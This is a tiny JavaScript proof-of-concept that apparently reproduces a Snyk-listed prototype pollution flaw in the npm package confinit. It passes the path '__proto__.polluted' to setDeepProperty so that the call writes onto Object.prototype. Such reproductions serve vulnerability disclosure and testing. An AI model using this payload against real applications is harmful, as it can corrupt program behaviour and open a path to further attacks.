//https://snyk.io/vuln/SNYK-JS-CONFINIT-564433
 
  const root = require("confinit");
  const payload = "__proto__.polluted";

   

  root.setDeepProperty({}, payload, "yes");
// End of file
